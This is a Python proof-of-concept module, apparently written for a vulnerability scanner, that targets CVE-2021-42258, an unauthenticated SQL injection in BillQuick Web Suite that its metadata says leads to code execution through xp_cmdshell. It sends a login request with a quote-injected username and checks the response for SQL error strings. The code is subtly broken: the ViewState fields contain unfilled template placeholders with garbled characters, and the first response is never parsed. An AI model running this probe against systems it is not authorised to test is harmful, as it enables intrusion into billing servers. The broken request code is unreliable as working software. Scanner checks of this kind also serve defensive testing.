import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''BillQuick Web Suite SQL Injection''',
        "description": '''BQE BillQuick Web Suite 2018 through 2021 before 22.0.9.1 allows SQL injection for unauthenticated remote code execution. Successful exploitation can include the ability to execute arbitrary code as MSSQLSERVER$ via xp_cmdshell.''',
        "severity": "critical",
        "references": [
            "https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-42258"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-42258",
            "cwe-id": "CWE-89"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "sqli", "billquick"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/"""
        method = "POST"
        data = """__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode("Â§VSÂ§")}}&__VIEWSTATEGENERATOR={{url_encode("Â§VSGÂ§")}}&__EVENTVALIDATION={{url_encode("Â§EVÂ§")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""System.Data.SqlClient.SqlException""" in resp1.text and """Incorrect syntax near""" in resp1.text and """_ACCOUNTLOCKED""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url